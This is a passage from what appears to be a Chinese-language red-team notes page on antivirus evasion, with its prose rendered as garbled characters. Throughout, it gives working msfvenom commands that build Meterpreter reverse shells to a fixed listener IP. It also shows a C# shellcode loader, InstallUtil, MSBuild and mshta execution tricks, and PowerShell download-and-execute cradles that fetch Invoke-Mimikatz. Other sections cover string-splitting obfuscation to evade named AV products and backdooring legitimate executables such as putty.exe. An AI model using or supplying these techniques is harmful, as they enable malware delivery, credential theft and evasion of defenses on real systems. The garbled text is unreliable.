        private static byte[] EncryptInitalize(byte[] key)
        &#123;
            byte[] s = Enumerable.Range(0, 256)
            .Select(i =&gt; (byte)i)
            .ToArray();
            for (int i = 0, j = 0; i &lt; 256; i++)
            &#123;
                j = (j + key[i % key.Length] + s[i]) &amp; 255;
                Swap(s, i, j);
            &#125;
            return s;
        &#125;
        private static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)
        &#123;
            byte[] s = EncryptInitalize(key);
            int i = 0;
            int j = 0;
            return data.Select((b) =&gt;
            &#123;
                i = (i + 1) &amp; 255;
                j = (j + s[i]) &amp; 255;
                Swap(s, i, j);
                return (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);
                &#125;);
        &#125;
        private static void Swap(byte[] s, int i, int j)
        &#123;
            byte c = s[i];
            s[i] = s[j];
            s[j] = c;
        &#125;
        [DllImport(&quot;kernel32.dll&quot;)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport(&quot;kernel32.dll&quot;)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    &#125;
&#125;
</code></pre>
<h4 id="XOR-AESç¼–ç "><a href="#XOR-AESç¼–ç " class="headerlink" title="XOR/AESç¼–ç "></a>XOR/AESç¼–ç </h4><pre><code>ä¸ä¸Šæ–‡xoråŠ å¯†ç±»ä¼¼
</code></pre>
<h4 id="CSC-InstallUtil"><a href="#CSC-InstallUtil" class="headerlink" title="CSC+InstallUtil"></a>CSC+InstallUtil</h4><pre><code>ç”Ÿæˆpayload
MSFç›‘å¬éœ€è®¾ç½®è‡ªåŠ¨è¿ç§»è¿›ç¨‹set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt
Payloadç²˜è´´åˆ°InstallUtil-Shellcode.csä¸­ä½¿ç”¨cscç¼–è¯‘
</code></pre>
<p><img src="./img/58.png" alt="image"></p>
<pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:C:\Users\y\Desktop\shell.exe C:\Users\y\Desktop\InstallUtil-ShellCode.cs
</code></pre>
<p><img src="./img/59.png" alt="image"></p>
<pre><code>æ‰§è¡Œ
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\shell.exe
</code></pre>
<h3 id="Pythonæºç å…æ€"><a href="#Pythonæºç å…æ€" class="headerlink" title="Pythonæºç å…æ€"></a>Pythonæºç å…æ€</h3><h4 id="pyinstalleråŠ è½½Cä»£ç ç¼–è¯‘"><a href="#pyinstalleråŠ è½½Cä»£ç ç¼–è¯‘" class="headerlink" title="pyinstalleråŠ è½½Cä»£ç ç¼–è¯‘"></a>pyinstalleråŠ è½½Cä»£ç ç¼–è¯‘</h4><pre><code>ç”ŸæˆCæ ¼å¼payload
MSFç›‘å¬éœ€è®¾ç½®è‡ªåŠ¨è¿ç§»è¿›ç¨‹set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.c
ç²˜è´´shellcodeåˆ°shellcode+c.pyä¸­ï¼Œåœ¨32ä½ç³»ç»Ÿä¸Šå®‰è£…pythonã€py2exeã€pyinstallerè¿›å…¥C:\Python27\Scriptsç›®å½•ä½¿ç”¨å‘½ä»¤æŠŠpyæ‰“åŒ…ä¸ºexe
&gt;python pyinstaller-script.py -F -w shellcode.py
ä¼šåœ¨ç›®å½•ä¸‹ç”Ÿæˆdistæ–‡ä»¶å¤¹ï¼Œexeæ–‡ä»¶å°±åœ¨é‡Œé¢
</code></pre>
<h4 id="pyinstalleråŠ è½½pyä»£ç ç¼–è¯‘"><a href="#pyinstalleråŠ è½½pyä»£ç ç¼–è¯‘" class="headerlink" title="pyinstalleråŠ è½½pyä»£ç ç¼–è¯‘(*)"></a>pyinstalleråŠ è½½pyä»£ç ç¼–è¯‘(*)</h4><pre><code>ç”Ÿæˆpyæ ¼å¼payload
MSFç›‘å¬éœ€è®¾ç½®è‡ªåŠ¨è¿ç§»è¿›ç¨‹set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp LPORT=12138 LHOST=192.168.0.108 -e x86/shikata_ga_nai -i 11 -f py -o /var/www/html/1.py
ç²˜è´´shellcodeåˆ°shellcode+py.pyä¸­ï¼Œåœ¨32ä½ç³»ç»Ÿä¸Šå®‰è£…pythonã€py2exeã€pyinstallerè¿›å…¥C:\Python27\Scriptsç›®å½•ä½¿ç”¨å‘½ä»¤æŠŠpyæ‰“åŒ…ä¸ºexe
&gt;python pyinstaller-script.py --console --onefile shellcode.py
ä¼šåœ¨ç›®å½•ä¸‹ç”Ÿæˆdistæ–‡ä»¶å¤¹ï¼Œexeæ–‡ä»¶å°±åœ¨é‡Œé¢
</code></pre>
<p><img src="./img/60.png" alt="image"><br><img src="./img/61.png" alt="image"><br><img src="./img/62.png" alt="image"></p>
<h4 id="Py2exeæ‰“åŒ…exe"><a href="#Py2exeæ‰“åŒ…exe" class="headerlink" title="Py2exeæ‰“åŒ…exe"></a>Py2exeæ‰“åŒ…exe</h4><pre><code>ç”Ÿæˆrawæ ¼å¼payload
MSFç›‘å¬éœ€è®¾ç½®è‡ªåŠ¨è¿ç§»è¿›ç¨‹set autorunscript migrate -n explorer.exe
&gt;msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/shell.py
åœ¨32ä½ç³»ç»Ÿä¸Šå®‰è£…pythonã€py2exe
åˆ›å»ºsetup.pyæ”¾ç½®åŒä¸€ç›®å½•
</code></pre>
<p><img src="./img/63.png" alt="image"></p>
<pre><code>from distutils.core import setup
import py2exe
setup(
name = &quot;Meter&quot;,
description = &quot;Python-based App&quot;,
version = &quot;1.0&quot;,
console = [&quot;shell.py&quot;],
options = &#123;&quot;py2exe&quot;:&#123;&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,&#125;&#125;,
zipfile = None
)
æ‰§è¡Œæ‰“åŒ…å‘½ä»¤
&gt;python setup.py py2exe
ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆdistæ–‡ä»¶å¤¹ï¼Œæ‰“åŒ…å¥½çš„exeåœ¨é‡Œé¢
</code></pre>
<p><img src="./img/64.png" alt="image"></p>
<h4 id="Base64ç¼–ç -Pyinstalleræ‰“åŒ…"><a href="#Base64ç¼–ç -Pyinstalleræ‰“åŒ…" class="headerlink" title="Base64ç¼–ç +Pyinstalleræ‰“åŒ…"></a>Base64ç¼–ç +Pyinstalleræ‰“åŒ…</h4><pre><code>MSFç›‘å¬éœ€è®¾ç½®è‡ªåŠ¨è¿ç§»è¿›ç¨‹set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.c
Shellcodeç²˜è´´åœ¨shellcode+base64+c.pyä¸­
&gt;python pyinstaller-script.py -F -w shellcode.py
ä¼šåœ¨ç›®å½•ä¸‹ç”Ÿæˆdistæ–‡ä»¶å¤¹ï¼Œexeæ–‡ä»¶å°±åœ¨é‡Œé¢
</code></pre>
<h4 id="åŠ è½½å™¨åˆ†ç¦»"><a href="#åŠ è½½å™¨åˆ†ç¦»" class="headerlink" title="åŠ è½½å™¨åˆ†ç¦»"></a>åŠ è½½å™¨åˆ†ç¦»</h4><h5 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h5><pre><code>ç”Ÿæˆcæ ¼å¼payload
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c
ä¸‹è½½k8final
</code></pre>
<p><img src="./img/65.png" alt="image"></p>
<pre><code>ç²˜è´´shellcodeè¿›å»
</code></pre>
<p><img src="./img/66.png" alt="image"></p>
<pre><code>ä½¿ç”¨
https://github.com/k8gege/scrun
</code></pre>
<p><img src="./img/67.png" alt="image"></p>
<pre><code>æˆ–
&gt;python scrun.py xxx
æˆ–
ç¼–è¯‘ScRunHex.pyä¸ºexe
</code></pre>
<h5 id="Base64"><a href="#Base64" class="headerlink" title="Base64(*)"></a>Base64(*)</h5><pre><code>ç”Ÿæˆcæ ¼å¼payload
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c
ä¸‹è½½k8final
</code></pre>
<p><img src="./img/68.png" alt="image"></p>
<pre><code>ç²˜è´´shellcodeè¿›å»
</code></pre>
<p><img src="./img/69.png" alt="image"></p>
<pre><code>è¿›è¡Œhexç¼–ç åï¼Œç²˜è´´è¿›å»base64ç¼–ç 
</code></pre>
<p><img src="./img/70.png" alt="image"></p>
<pre><code>çœ‹ç³»ç»Ÿä½æ•°ç¼–è¯‘ScRunBase.pyæ–‡ä»¶ï¼Œä½¿ç”¨pyinstalleræ‰“åŒ…ä¸ºexeåæ‰§è¡Œ
https://gitee.com/RichChigga/scrun/blob/master/ScRunBase64.py
&gt;python pyinstaller-script.py -F -w ScRunBase64.py
</code></pre>
<p><img src="./img/71.png" alt="image"><br><img src="./img/72.png" alt="image"></p>
<h3 id="DLLåŠ«æŒ"><a href="#DLLåŠ«æŒ" class="headerlink" title="DLLåŠ«æŒ"></a>DLLåŠ«æŒ</h3><pre><code>ç™½dllåŠ«æŒ
ProcessmonitoræŸ¥æ‰¾ç¨‹åºåŠ è½½çš„dll
ä½¿ç”¨stud_peåŠ è½½dllè¿›å»
æˆ–
ç”Ÿæˆpayloadå…æ€å¥½ç²˜è´´è¿›å»ï¼ŒæŸ¥çœ‹ç›®æ ‡ä¸Šæœ‰ä»€ä¹ˆè½¯ä»¶ï¼Œæœ¬åœ°æŸ¥æ‰¾å¯åŠ«æŒçš„dll,åŠ«æŒå¥½æ–‡ä»¶åä¼ ä¸Šå»ã€‚
</code></pre>
<p><img src="./img/73.png" alt="image"></p>
<h3 id="MSBuild"><a href="#MSBuild" class="headerlink" title="MSBuild"></a>MSBuild</h3><pre><code>é“¾æ¥
https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml
&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f csharp
è¿œç¨‹æ‰§è¡Œ
&gt;wmiexec.py &lt;USER&gt;:&#39;&lt;PASS&gt;&#39;@&lt;RHOST&gt; cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\&lt;attackerip&gt;\&lt;share&gt;\msbuild_nps.xml
è¦è®¾ç½®è‡ªåŠ¨è¿ç§»è¿›ç¨‹
</code></pre>
<p><img src="./img/74.png" alt="image"></p>
<h3 id="GreatSCT"><a href="#GreatSCT" class="headerlink" title="GreatSCT"></a>GreatSCT</h3><pre><code>&gt;use Bypass
&gt;list
&gt;use regasm/meterpreter/rev_tcp.py
&gt;msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
</code></pre>
<h3 id="Mshta"><a href="#Mshta" class="headerlink" title="Mshta"></a>Mshta</h3><pre><code>https://github.com/mdsecactivebreach/CACTUSTORCH/blob/master/CACTUSTORCH.hta
ç”Ÿæˆ
&gt;msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/1.bin
&gt;cat 1.bin |base64 -w 0
</code></pre>
<p><img src="./img/75.png" alt="image"></p>
<pre><code>ç¼–ç åçš„å†…å®¹å¤åˆ¶åˆ°
</code></pre>
<p><img src="./img/76.png" alt="image"></p>
<pre><code>æ‰§è¡Œ
&gt;mshta http://192.168.0.106:1222/1.hta
360æ‰§è¡Œæ£€æµ‹å‡ºæ¥ï¼Œé™æ€åŠ¨æ€æ— æ³•æ£€æµ‹ã€ç«ç»’æ— æ³•æ£€æµ‹
</code></pre>
<h3 id="InstallUtil"><a href="#InstallUtil" class="headerlink" title="InstallUtil"></a>InstallUtil</h3><pre><code>å†…ç½‘æ–‡ç« ä¸­æœ‰ä»‹ç»
</code></pre>
<h3 id="Veil"><a href="#Veil" class="headerlink" title="Veil"></a>Veil</h3><pre><code>&gt;use 1é€‰æ‹©evasionæ¨¡å—
&gt;listæŸ¥çœ‹å¯ç”¨payload
&gt;use 7 é€‰æ‹©cæ ¼å¼çš„payload
&gt;set LHOST/LPORTè®¾ç½®å›è¿IPå’Œç«¯å£
&gt;generateç”Ÿæˆ
</code></pre>
<p><img src="./img/77.png" alt="image"></p>
<pre><code>ç›´æ¥ç”Ÿæˆçš„exeå¯èƒ½ä¼šè¢«æŸ¥æ€ï¼Œç›®å‰å¯è¿‡360ï¼Œä¸èƒ½è¿‡ç«ç»’
ä½¿ç”¨minGW-w64ç¼–è¯‘Cæ–‡ä»¶
&gt;gcc -o vel.exe veil.c -l ws2_32
</code></pre>
<h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 lhost=192.168.0.108 lport=3333 RC4PASSWORD=123qwe!@# -f c
</code></pre>
<h3 id="æ†ç»‘-1"><a href="#æ†ç»‘-1" class="headerlink" title="æ†ç»‘"></a>æ†ç»‘</h3><pre><code>&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata_ga_nai -x PsExec64.exe  -i 15 -f exe -o /var/www/html/payload4.exe
</code></pre>
<h3 id="Evasionæ¨¡å—"><a href="#Evasionæ¨¡å—" class="headerlink" title="Evasionæ¨¡å—"></a>Evasionæ¨¡å—</h3><pre><code>&gt;show evasion
</code></pre>
<h3 id="Phantom-Evasion"><a href="#Phantom-Evasion" class="headerlink" title="Phantom-Evasion"></a>Phantom-Evasion</h3><p><img src="./img/78.png" alt="image"><br><img src="./img/79.png" alt="image"></p>
<h3 id="Shellter"><a href="#Shellter" class="headerlink" title="Shellter"></a>Shellter</h3><pre><code>ä»…æ”¯æŒ32ä½ç¨‹åº
&gt;apt install shellter
æŒ‡å®šä¸€ä¸ªexeæ–‡ä»¶
</code></pre>
<p><img src="./img/80.png" alt="image"></p>
<pre><code>é€‰æ‹©payload
</code></pre>
<h3 id="the-backdoor-factory"><a href="#the-backdoor-factory" class="headerlink" title="the-backdoor-factory"></a>the-backdoor-factory</h3><pre><code>æŸ¥çœ‹æ˜¯å¦æ”¯æŒæ†ç»‘
&gt;python backdoor.py -f /root/Desktop/putty.exe -S
æŸ¥çœ‹æ­¤æ–‡ä»¶æ”¯æŒå“ªäº›payload
&gt;python backdoor.py -f /root/Desktop/putty.exe -s show
reverse_shell_tcp_inlineå¯¹åº”msf
set payload windows/meterpreter/reverse_tcp
meterpreter_reverse_https_threadedåº”msf
set payload windows/meterpreter/reverse_https
iat_reverse_tcp_stager_threadedä¿®å¤IAT
user_supplied_shellcode_threadedè‡ªå®šä¹‰payload
å‚æ•°
-s æŒ‡å®špayload
-H å›è¿åœ°å€
-P å›è¿ç«¯å£
-J å¤šä»£ç è£‚ç¼æ³¨å…¥
&gt;python backdoor.py -f ~/putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.0.108 -P 12138 -J -o payload.exe
åé—¨ç”Ÿæˆåœ¨backdooredç›®å½•
æˆ–
ç”Ÿæˆpayload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata_ga_nai -i 5 -f raw -o shellcode.c
è‡ªå®šä¹‰
&gt;python backdoor.py -f /root/putty.exe -s user_supplied_shellcode_threaded -U /root/shellcode.c  -o payload2.exe
</code></pre>
<h3 id="zirikatu"><a href="#zirikatu" class="headerlink" title="zirikatu"></a>zirikatu</h3><p><img src="./img/81.png" alt="image"></p>
<h3 id="hanzoInjection"><a href="#hanzoInjection" class="headerlink" title="hanzoInjection"></a>hanzoInjection</h3><pre><code>https://github.com/P0cL4bs/hanzoInjection
ç”Ÿæˆ
&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f raw -o /var/www/html/1.bin
&gt;HanzoInjection.exe -p 1.bin -o 1.cs
ç¼–è¯‘1.cs
å±æ€§-ç”Ÿæˆ-å…è®¸ä¸å®‰å…¨ä»£ç 
</code></pre>
<h2 id="PowerShellå…æ€"><a href="#PowerShellå…æ€" class="headerlink" title="PowerShellå…æ€"></a>PowerShellå…æ€</h2><h3 id="ç›´æ¥ç”Ÿæˆ"><a href="#ç›´æ¥ç”Ÿæˆ" class="headerlink" title="ç›´æ¥ç”Ÿæˆ"></a>ç›´æ¥ç”Ÿæˆ</h3><pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 15 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f psh -o /var/www/html/1.ps1
æ‰§è¡Œ
&gt;powershell -ep bypass -noexit -file 1.ps1
Powershellè¡Œä¸ºæ£€æµ‹bypass
&gt;powershell -noexit &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://192.168.0.108/1.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;
</code></pre>
<h3 id="Invoke-ShellcodeåŠ è½½"><a href="#Invoke-ShellcodeåŠ è½½" class="headerlink" title="Invoke-ShellcodeåŠ è½½"></a>Invoke-ShellcodeåŠ è½½</h3><pre><code>ç”Ÿæˆcode
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f powershell -o /var/www/html/1.ps1
ç›®æ ‡æ‰§è¡Œ
&gt; powershell -ep bypass
&gt; IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/ps/powersploit/CodeExecution/Invoke-Shellcode.ps1&#39;)
&gt; IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/1.ps1&#39;)
&gt; Invoke-Shellcode -Shellcode ($buf) -Force
</code></pre>
<p><img src="./img/82.png" alt="image"><br><img src="./img/83.png" alt="image"></p>
<pre><code>é˜²æŠ¤è½¯ä»¶æ²¡ååº”
</code></pre>
<h3 id="Invoke-Obfuscation"><a href="#Invoke-Obfuscation" class="headerlink" title="Invoke-Obfuscation"></a>Invoke-Obfuscation</h3><pre><code>https://github.com/danielbohannon/Invoke-Obfuscation
ç”Ÿæˆcode
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f psh -o /var/www/html/1.ps1
&gt;powershell -ep bypass
&gt;Import-Module .\Invoke-Obfuscation.psd1
&gt;Invoke-Obfuscation
&gt;set scriptpath C:\Users\y\Desktop\1.ps1
&gt;encoding
&gt;3 æŒ‡å®šç¼–ç æ–¹å¼
&gt;out C:\Users\y\Desktop\ok.ps1 ä¿å­˜
</code></pre>
<p><img src="./img/84.png" alt="image"><br><img src="./img/85.png" alt="image"></p>
<pre><code>æ‰§è¡Œ
&gt;powershell -ep bypass -noexit -file ok.ps1
</code></pre>
<p><img src="./img/86.png" alt="image"><br><img src="./img/87.png" alt="image"><br><img src="./img/88.png" alt="image"></p>
<h3 id="Xencrypt"><a href="#Xencrypt" class="headerlink" title="Xencrypt"></a>Xencrypt</h3><pre><code>https://github.com/the-xentropy/xencrypt/blob/master/xencrypt.ps1
&gt;Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1 -Iterations 100 é€’å½’åˆ†å±‚èº²é¿åŠ¨æ€æŸ¥æ€
</code></pre>
<p><img src="./img/89.png" alt="image"></p>
<pre><code>&gt;Invoke-Xencrypt -infile .\Invoke-Mimikatz.ps1 -outfile mimi.ps1
</code></pre>
<p><img src="./img/90.png" alt="image"><br><img src="./img/91.png" alt="image"></p>
<h3 id="PyFuscation"><a href="#PyFuscation" class="headerlink" title="PyFuscation"></a>PyFuscation</h3><pre><code>https://github.com/CBHue/PyFuscation
å¯¹å‡½æ•°ï¼Œå‚æ•°ï¼Œå˜é‡è¿›è¡Œæ··æ·†
&gt;python3 PyFuscation.py -fvp --ps Invoke-Mimikatz.ps1
</code></pre>
<p><img src="./img/92.png" alt="image"><br><img src="./img/93.png" alt="image"></p>
<h3 id="æ‹†åˆ†-Cç¼–è¯‘"><a href="#æ‹†åˆ†-Cç¼–è¯‘" class="headerlink" title="æ‹†åˆ†+Cç¼–è¯‘"></a>æ‹†åˆ†+Cç¼–è¯‘</h3><pre><code>#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
int main()&#123;
system(&quot;powershell $c2=&#39;IEX (New-Object Net.WebClient).Downlo&#39;;$c3=&#39;adString(&#39;&#39;http://x.x.x.x/a&#39;&#39;)&#39;; $Text=$c2+$c3; IEX(-join $Text)&quot;);
return 0;
&#125;
</code></pre>
<h3 id="è¡Œä¸ºæ£€æµ‹"><a href="#è¡Œä¸ºæ£€æµ‹" class="headerlink" title="è¡Œä¸ºæ£€æµ‹"></a>è¡Œä¸ºæ£€æµ‹</h3><pre><code>&gt;powershell.exe -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;
</code></pre>
<h3 id="Out-EncryptedScript"><a href="#Out-EncryptedScript" class="headerlink" title="Out-EncryptedScript"></a>Out-EncryptedScript</h3><pre><code>http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1
&gt;Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password shabiisme -Salt 123456
</code></pre>
<p><img src="./img/94.png" alt="image"><br><img src="./img/95.png" alt="image"></p>
<pre><code>PS &gt; IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1&quot;)
PS &gt; [String] $cmd = Get-Content .\evil.ps1
PS &gt; Invoke-Expression $cmd
PS &gt; $decrypted = de shabiisme 123456
PS &gt; Invoke-Expression $decrypted
PS &gt; Invoke-Mimikatz
</code></pre>
<h3 id="cobalt-strike-powershellå…æ€"><a href="#cobalt-strike-powershellå…æ€" class="headerlink" title="cobalt strike powershellå…æ€"></a>cobalt strike powershellå…æ€</h3><pre><code>From: https://y4er.com/post/cobalt-strike-powershell-bypass/
powershell&gt;$string = &#39;&#39;
powershell&gt;$s = [Byte[]]$var_code = [System.Convert]::FromBase64String(&#39;[csç”Ÿæˆçš„shellcode]&#39;)
powershell&gt;$s |foreach &#123; $string = $string + $_.ToString()+&#39;,&#39;&#125;
powershell&gt;$string&gt;c:\1.txt
ä¿®æ”¹psè„šæœ¬
[Byte[]]$var_code = [Byte[]](payload)
å†æ··æ·†ä¸€ä¸‹å‡½æ•°å’Œå˜é‡
ç»•è¿‡æ‰§è¡Œå‘½ä»¤çš„æ‹¦æˆª
ä½¿ç”¨csçš„å‚æ•°æ¬ºéª—
beacon &gt; argue cmd.exe blablabla
</code></pre>
<h3 id="åˆ†å—å…æ€"><a href="#åˆ†å—å…æ€" class="headerlink" title="åˆ†å—å…æ€"></a>åˆ†å—å…æ€</h3><pre><code>ç”Ÿæˆ
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.0.108 LPORT=443 -f psh-net -o shity_shellcode.ps1
</code></pre>
<p><img src="./img/700.png" alt="image"></p>
<pre><code>å…ˆæ¥æµ‹è¯•ä¸€ä¸‹ï¼ŒæŠŠps1æ–‡ä»¶çš„shellcodeæ¢æˆä¸€æ®µæ— å®³çš„å­—ç¬¦ä¸²
</code></pre>
<p><img src="./img/701.png" alt="image"><br><img src="./img/702.png" alt="image"></p>
<pre><code>ç»“æœå‘ç°è¿˜æ˜¯è¢«æŸ¥æ€äº†
</code></pre>
<p><img src="./img/703.png" alt="image"></p>
<pre><code>è¿™è¡¨æ˜å¤§å¤šæ•°æ£€æµ‹æ¥è‡ªPowerShellæ¨¡æ¿ï¼Œè€Œä¸æ˜¯Shellcodeæœ¬èº«ã€‚
ä¸‹é¢å‡ ç§bypassæ–¹æ³•
1.å°†å­—ç¬¦ä¸²åˆ†æˆå‡ éƒ¨åˆ†å¹¶åˆ›å»ºä¸­é—´å˜é‡ï¼›
2.æ·»åŠ å¤§é‡åƒåœ¾å¤‡æ³¨ï¼›
3.æ·»åŠ ä¸€äº›åƒåœ¾æŒ‡ä»¤ï¼Œä¾‹å¦‚å¾ªç¯æˆ–ç¡çœ æŒ‡ä»¤ï¼ˆå¯¹äºæ²™ç›’æœ‰ç”¨ï¼‰ã€‚
[DllImport(&quot;kernel32.dll&quot;)]
å˜ä¸º
[DllImport(&quot;ke&quot;+&quot;rne&quot;+&quot;l32.dll&quot;)] #å¯ç»•è¿‡èµ›é—¨é“å…‹
$przdE.ReferencedAssemblies.AddRange(@(&quot;System.dll&quot;,[PsObject].Assembly.Location))
å˜ä¸º
$magic=&quot;Syst&quot;+&quot;em&quot;+&quot;.dll&quot;;
$przdE.ReferencedAssemblies.AddRange(@($magic,[PsObject].Assembly.Location))
åˆ†å‰²shellcode
$sc0=&lt;shellcodeçš„ç¬¬1éƒ¨åˆ†&gt;; â€¦$sc7=&lt;shellcodeçš„ç¬¬8éƒ¨åˆ†&gt;; [Byte[]]$tcomplete_sc=[System.Convert]::FromBase64String($sc0+$sc1+â€¦+$sc7)
ä¸€äº›ç»†èŠ‚å¯å‚ç…§
https://raw.githubusercontent.com/kmkz/Pentesting/master/AV_Evasion/AV_Bypass.ps1
æˆ‘ä¸å¤ªæ‡‚æ±‡ç¼–è¯­è¨€ï¼Œæ‰€ä»¥æ²¡æœ‰æ·»åŠ æ— å®³æŒ‡ä»¤ã€‚
è¿™é‡Œç›´æ¥ä½¿ç”¨ä¸€é”®ç”Ÿæˆçš„bashè„šæœ¬ï¼Œæœ‰æ—¶é—´çš„å¯ä»¥è¯»è¯»é‡Œé¢çš„å‘½ä»¤
https://github.com/darksh3llRU/tools/blob/master/psh-net_shellcode_fastchange.sh
è¿™ä¸ªè„šæœ¬æ˜¯ç”Ÿæˆä¸ªhtaçš„ï¼Œè„šæœ¬ä»¥1337ä¸ªå­—ç¬¦æ¥åˆ†å—
</code></pre>
<p><img src="./img/704.png" alt="image"></p>
<pre><code>æˆ‘æµ‹è¯•çš„æ—¶å€™1337ä¸ªå­—ç¬¦ä¼šè¢«èµ›é—¨é“å…‹æŸ¥æ€åˆ°ï¼Œæˆ‘è¿™é‡Œä¿®æ”¹æˆ250ä¸ªå­—ç¬¦æ¥åˆ†å—
</code></pre>
<p><img src="./img/705.png" alt="image"></p>
<pre><code>å› ä¸ºæˆ‘æ²¡åŠ æ±‡ç¼–æŒ‡ä»¤ï¼Œä¸­é—´è¿™é‡Œç›´æ¥æŒ‰ä»»æ„é”®è·³è¿‡å³å¯ï¼Œæ‡‚çš„å¯ä»¥åœ¨å¼€å¤´æ·»åŠ ä¸€äº›æŒ‡ä»¤ï¼Œä¾‹å¦‚xorï¼Œincï¼Œdecï¼Œaddï¼Œsubï¼Œmovï¼Œnopç­‰
</code></pre>
<p><img src="./img/706.png" alt="image"></p>
<pre><code>æ‰§è¡Œå®Œåä¼šç”Ÿæˆä¸€äº›æ–‡ä»¶
</code></pre>
<p><img src="./img/707.png" alt="image"></p>
<pre><code>æˆ‘ä»¬åªç”¨final_pshnet_revhttps.ps1è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€ä¿®æ”¹ä¸€ä¸‹
</code></pre>
<p><img src="./img/708.png" alt="image"></p>
<pre><code>ä¿®æ”¹æˆ
</code></pre>
<p><img src="./img/709.png" alt="image"><br><img src="./img/710.png" alt="image"><br><img src="./img/711.png" alt="image"></p>
<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><pre><code>ç›®æ ‡æœºå™¨è£…æœ‰rubyæ—¶
ç”Ÿæˆ
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f ruby
ç²˜è´´åˆ°rubyä¸­
</code></pre>
<p><img src="./img/96.png" alt="image"></p>
<pre><code>æ‰§è¡Œ
&gt;ruby xx.ruby
</code></pre>
<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><pre><code>ç”Ÿæˆ
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f c
ä»£ç è½¬æ¢æˆ0xæ ¼å¼ï¼Œç²˜è´´åˆ°go.txtä¸­ä¿å­˜ä¸ºgoæ ¼å¼
</code></pre>
<p><img src="./img/97.png" alt="image"></p>
<pre><code>å®‰è£…golangç¯å¢ƒåœ¨shellcodeç›®å½•æ‰§è¡Œ
